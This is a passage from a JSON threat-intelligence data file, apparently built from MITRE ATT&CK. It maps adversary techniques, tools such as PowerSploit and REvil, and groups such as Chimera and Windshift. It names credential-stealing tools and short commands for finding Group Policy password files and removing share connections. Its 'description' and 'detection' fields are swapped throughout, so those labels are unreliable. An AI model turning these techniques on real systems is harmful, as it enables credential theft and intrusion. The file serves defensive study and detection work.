                "detection": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Portable Executable Injection",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1123",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Audio Capture",
                "chain_phase": "collection",
                "description": "Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.",
                "detection": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1034",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Path Interception",
                "chain_phase": "persistence",
                "description": "Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious. \n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "**This technique has been deprecated. Please use Path Interception by PATH Environment Variable, Path Interception by Search Order Hijacking, and/or Path Interception by Unquoted Path.**\n\nPath interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of cmd in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. \n\nThere are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\n\n### Unquoted Paths\nService paths (stored in Windows Registry keys)  and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>).  An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program.  \n\n### PATH Environment Variable Misconfiguration\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if <code>C:\\example path</code> precedes <code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.\n\n### Search Order Hijacking\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. \n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0194",
            "type": "tool",
            "attributes": {
                "name": "PowerSploit",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "PowerSploit is an open source, offensive security framework comprised of PowerShell modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1555.004": "Windows Credential Manager",
                    "T1027.005": "Indicator Removal from Tools",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1574.008": "Path Interception by Search Order Hijacking",
                    "T1574.007": "Path Interception by PATH Environment Variable",
                    "T1574.009": "Path Interception by Unquoted Path",
                    "T1059.001": "PowerShell",
                    "T1087.001": "Local Account",
                    "T1056.001": "Keylogging",
                    "T1558.003": "Kerberoasting",
                    "T1552.006": "Group Policy Preferences",
                    "T1003.001": "LSASS Memory",
                    "T1552.002": "Credentials in Registry",
                    "T1547.005": "Security Support Provider",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.002": "Portable Executable Injection",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1053.005": "Scheduled Task",
                    "T1482": "Domain Trust Discovery",
                    "T1134": "Access Token Manipulation",
                    "T1123": "Audio Capture",
                    "T1113": "Screen Capture",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1034": "Path Interception",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            },
            "val": 29
        },
        {
            "id": "S0105",
            "type": "tool",
            "attributes": {
                "name": "dsquery",
                "aliases": [
                    "dsquery.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "dsquery is a command-line utility that can be used to query Active Directory for information from a system within a domain.  It is typically installed only on Windows Server versions but can be installed on non-server variants through the Microsoft-provided Remote Server Administration Tools bundle.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1482": "Domain Trust Discovery"
                }
            },
            "val": 3
        },
        {
            "id": "S0104",
            "type": "tool",
            "attributes": {
                "name": "netstat",
                "aliases": [
                    "netstat.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "netstat is an operating system utility that displays active TCP connections, listening ports, and network statistics.",
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ],
                "techniques": {
                    "T1049": "System Network Connections Discovery"
                }
            },
            "val": 1
        },
        {
            "id": "G0115",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "GOLD SOUTHFIELD",
                "aliases": [],
                "description": "GOLD SOUTHFIELD is a financially motivated threat group active since at least 2019 that operates the REvil Ransomware-as-a Service (RaaS). GOLD SOUTHFIELD provides backend infrastructure for affiliates recruited on underground forums to perpetrate high value deployments.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0591": "ConnectWise",
                    "S0496": "REvil"
                },
                "techniques": {
                    "T1195.002": "Compromise Software Supply Chain",
                    "T1059.001": "PowerShell",
                    "T1566": "Phishing",
                    "T1190": "Exploit Public-Facing Application",
                    "T1219": "Remote Access Software",
                    "T1199": "Trusted Relationship",
                    "T1133": "External Remote Services",
                    "T1113": "Screen Capture",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "S0591",
            "type": "tool",
            "attributes": {
                "name": "ConnectWise",
                "aliases": [
                    "ScreenConnect"
                ],
                "labels": [
                    "tool"
                ],
                "description": "ConnectWise is a legitimate remote administration tool that has been used since at least 2016 by threat actors including MuddyWater and GOLD SOUTHFIELD to connect to and conduct lateral movement in target environments.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.001": "PowerShell",
                    "T1125": "Video Capture",
                    "T1113": "Screen Capture"
                }
            },
            "val": 3
        },
        {
            "id": "T1485",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Destruction",
                "chain_phase": "impact",
                "description": "Use process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as [SDelete](https://attack.mitre.org/software/S0195). Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under <code>C:\\Windows\\System32\\</code>.\n\nIn cloud environments, the occurrence of anomalous high-volume deletion events, such as the <code>DeleteDBCluster</code> and <code>DeleteGlobalCluster</code> events in AWS, or a high quantity of data deletion events, such as <code>DeleteBucket</code>, within a short period of time may indicate suspicious activity.",
                "detection": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from Disk Content Wipe and Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares..\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1189",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Drive-by Compromise",
                "chain_phase": "initial-access",
                "description": "Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.\n\nNetwork intrusion detection systems, sometimes with SSL/TLS MITM inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.\n\nDetecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
                "detection": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\n\nMultiple ways of delivering exploit code to a browser exist, including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\n* Malicious ads are paid for and served through legitimate ad providers.\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "SaaS"
                ]
            }
        },
        {
            "id": "T0886",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote Services",
                "chain_phase": "initial-access-ics",
                "description": [],
                "detection": "Adversaries may leverage remote services to move between assets and network segments. These services are often used to allow operators to interact with systems remotely within the network, some examples are RDP, SMB, SSH, and other similar mechanisms. Remote services could be used to support remote access, data transmission, authentication, name resolution, and other remote functions. Further, remote services may be necessary to allow operators and administrators to configure systems within the network from their engineering or management workstations. An adversary may use this technique to access devices which may be dual-homed to multiple network segments, and can be used for Program Download or to execute attacks on control devices directly through Valid Accounts. Specific remote services (RDP & VNC) may be a precursor to enable Graphical User Interface execution on devices such as HMIs or engineering workstation software.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Human-Machine Interface",
                    "Control Server",
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0853",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Scripting",
                "chain_phase": "execution-ics",
                "description": [],
                "detection": "Adversaries may use scripting languages to execute arbitrary code in the form of a pre-written script or in the form of user-supplied code to an interpreter. Scripting languages are programming languages that differ from compiled languages, in that scripting languages use an interpreter, instead of a compiler. These interpreters read and compile part of the source code just before it is executed, as opposed to compilers, which compile each and every line of code to an executable file. Scripting allows software developers to run their code on any system where the interpreter exists. This way, they can distribute one package, instead of precompiling executables for many different systems. Scripting languages, such as Python, have their interpreters shipped as a default with many Linux distributions.  \n\nIn addition to being a useful tool for developers and administrators, scripting language interpreters may be abused by the adversary to execute code in the target environment. Due to the nature of scripting languages, this allows for weaponized code to be deployed to a target easily, and leaves open the possibility of on-the-fly scripting to perform a task.",
                "is_subtype": false,
                "platforms": [
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0869",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Standard Application Layer Protocol",
                "chain_phase": "command-and-control-ics",
                "description": [],
                "detection": "Adversaries may establish command and control capabilities over commonly used application layer protocols such as HTTP(S), OPC, RDP, telnet, DNP3, and modbus. These protocols may be used to disguise adversary actions as benign network traffic. Standard protocols may be seen on their associated port or in some cases over a non-standard port.\n\nAdversaries may use these protocols to reach out of the network for command and control, or in some cases to other infected devices within the network.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Control Server",
                    "Data Historian",
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0863",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "User Execution",
                "chain_phase": "execution-ics",
                "description": [],
                "detection": "Adversaries may rely on a targeted organizations’ user interaction for the execution of malicious code. User interaction may consist of installing applications, opening email attachments, or granting higher permissions to documents. \n\nAdversaries may embed malicious code or visual basic code into files such as Microsoft Word and Excel documents or software installers.  Execution of this code requires that the user enable scripting or write access within the document. Embedded code may not always be noticeable to the user especially in cases of trojanized software.",
                "is_subtype": false,
                "platforms": [
                    "Engineering Workstation",
                    "Human-Machine Interface"
                ]
            }
        },
        {
            "id": "T0828",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Loss of Productivity and Revenue",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may cause loss of productivity and revenue through disruption and even damage to the availability and integrity of control system operations, devices, and related processes. This technique may manifest as a direct effect of an ICS-targeting attack or tangentially, due to an IT-targeting attack against non-segregated environments. In some cases, this may result from the postponement and disruption of ICS operations and production as part of a remediation effort. Operations may be brought to a halt and effectively stopped in an effort to contain and properly remove malware or due to the <span class=\"smw-format list-format \"><span class=\"smw-row\"><span class=\"smw-field\"><span class=\"smw-value\">Loss of Safety</span></span></span></span>.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0881",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Service Stop",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nServices may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct Data Destruction.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Human-Machine Interface",
                    "Control Server",
                    "Data Historian",
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0882",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Theft of Operational Information",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may steal operational information on a production environment as a direct mission outcome for personal gain or to inform future operations. This information may include design documents, schedules, rotational data, or similar artifacts that provide insight on operations. \n\nIn the Bowman Dam incident, adversaries probed systems for operational data.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0849",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Masquerading",
                "chain_phase": "evasion-ics",
                "description": [],
                "detection": "Adversaries may use masquerading to disguise a malicious application or executable as another file, to avoid operator and engineer suspicion. Possible disguises of these masquerading files can include commonly found programs, expected vendor executables and configuration files, and other commonplace application and naming conventions. By impersonating expected and vendor-relevant files and applications, operators and engineers may not notice the presence of the underlying malicious content and possibly end up running those masquerading as legitimate functions. \n\nApplications and other files commonly found on Windows systems or in engineering workstations have been impersonated before. This can be as simple as renaming a file to effectively disguise it in the ICS environment.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Control Server"
                ]
            }
        },
        {
            "id": "S0496",
            "type": "tool",
            "attributes": {
                "name": "REvil",
                "aliases": [
                    "Sodin",
                    "Sodinokibi"
                ],
                "labels": [
                    "malware"
                ],
                "description": "REvil is a ransomware family that has been linked to the GOLD SOUTHFIELD group and operated as ransomware-as-a-service (RaaS) since at least April 2019. REvil is highly configurable and shares code similarities with the GandCrab RaaS.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1069.002": "Domain Groups",
                    "T1562.001": "Disable or Modify Tools",
                    "T1134.002": "Create Process with Token",
                    "T1134.001": "Token Impersonation/Theft",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1490": "Inhibit System Recovery",
                    "T1489": "Service Stop",
                    "T1486": "Data Encrypted for Impact",
                    "T1485": "Data Destruction",
                    "T1189": "Drive-by Compromise",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1055": "Process Injection",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery",
                    "T0886": "Remote Services",
                    "T0853": "Scripting",
                    "T0869": "Standard Application Layer Protocol",
                    "T0863": "User Execution",
                    "T0828": "Loss of Productivity and Revenue",
                    "T0881": "Service Stop",
                    "T0882": "Theft of Operational Information",
                    "T0849": "Masquerading"
                }
            },
            "val": 38
        },
        {
            "id": "G0114",
            "type": "group",
            "attributes": {
                "val": 6,
                "name": "Chimera",
                "aliases": [],
                "description": "Chimera is a suspected China-based threat group that has been active since at least 2018 targeting the semiconductor industry in Taiwan as well as data from the airline industry.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0521": "BloodHound",
                    "S0404": "esentutl",
                    "S0154": "Cobalt Strike",
                    "S0039": "Net",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1589.001": "Credentials",
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1572": "Protocol Tunneling",
                    "T1074.002": "Remote Data Staging",
                    "T1074.001": "Local Data Staging",
                    "T1078.002": "Domain Accounts",
                    "T1574.002": "DLL Side-Loading",
                    "T1069.001": "Local Groups",
                    "T1570": "Lateral Tool Transfer",
                    "T1569.002": "Service Execution",
                    "T1567.002": "Exfiltration to Cloud Storage",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1560.001": "Archive via Utility",
                    "T1114.002": "Remote Email Collection",
                    "T1114.001": "Local Email Collection",
                    "T1213.002": "Sharepoint",
                    "T1556.001": "Domain Controller Authentication",
                    "T1003.003": "NTDS",
                    "T1110.004": "Credential Stuffing",
                    "T1110.003": "Password Spraying",
                    "T1021.006": "Windows Remote Management",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1550.002": "Pass the Hash",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1053.005": "Scheduled Task",
                    "T1482": "Domain Trust Discovery",
                    "T1217": "Browser Bookmark Discovery",
                    "T1201": "Password Policy Discovery",
                    "T1135": "Network Share Discovery",
                    "T1133": "External Remote Services",
                    "T1124": "System Time Discovery",
                    "T1119": "Automated Collection",
                    "T1111": "Two-Factor Authentication Interception",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1078": "Valid Accounts",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1039": "Data from Network Shared Drive",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery"
                }
            }
        },
        {
            "id": "S0404",
            "type": "tool",
            "attributes": {
                "name": "esentutl",
                "aliases": [
                    "esentutl.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "esentutl is a command-line tool that provides database utilities for the Windows Extensible Storage Engine.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1564.004": "NTFS File Attributes",
                    "T1570": "Lateral Tool Transfer",
                    "T1003.003": "NTDS",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 4
        },
        {
            "id": "T1070.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Network Share Connection Removal",
                "chain_phase": "defense-evasion",
                "description": "Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [Windows Admin Shares](https://attack.mitre.org/techniques/T1077). SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.",
                "detection": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1124",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Time Discovery",
                "chain_phase": "discovery",
                "description": "Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.",
                "detection": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network.  \n\nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. \n\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job , or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0039",
            "type": "tool",
            "attributes": {
                "name": "Net",
                "aliases": [
                    "net.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "The Net utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. \n\nNet has a great deal of functionality,  much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through SMB/Windows Admin Shares using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1069.001": "Local Groups",
                    "T1569.002": "Service Execution",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1070.005": "Network Share Connection Removal",
                    "T1136.002": "Domain Account",
                    "T1136.001": "Local Account",
                    "T1201": "Password Policy Discovery",
                    "T1135": "Network Share Discovery",
                    "T1124": "System Time Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1018": "Remote System Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 15
        },
        {
            "id": "G0112",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Windshift",
                "aliases": [
                    "Bahamut"
                ],
                "description": "Windshift is a threat group that has been active since at least 2017, targeting specific individuals for surveillance in government departments and critical infrastructure across the Middle East.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0466": "WindTail"
                },
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.005": "Visual Basic",
                    "T1566.003": "Spearphishing via Service",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1036.001": "Invalid Code Signature",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1518": "Software Discovery",
                    "T1189": "Drive-by Compromise",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1036": "Masquerading",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1581": "Geofencing",
                    "T1533": "Data from Local System",
                    "T1523": "Evade Analysis Environment",
                    "T1521": "Standard Cryptographic Protocol",
                    "T1512": "Capture Camera",
                    "T1475": "Deliver Malicious App via Authorized App Store",
                    "T1476": "Deliver Malicious App via Other Means",
                    "T1478": "Install Insecure or Malicious Configuration",
                    "T1406": "Obfuscated Files or Information",
                    "T1417": "Input Capture",
                    "T1420": "File and Directory Discovery",
                    "T1426": "System Information Discovery",
                    "T1412": "Capture SMS Messages",
                    "T1407": "Download New Code at Runtime",
                    "T1429": "Capture Audio",
                    "T1430": "Location Tracking",
                    "T1432": "Access Contact List"
                }
            }
        },
        {
            "id": "T1048.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                "chain_phase": "exfiltration",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) ",
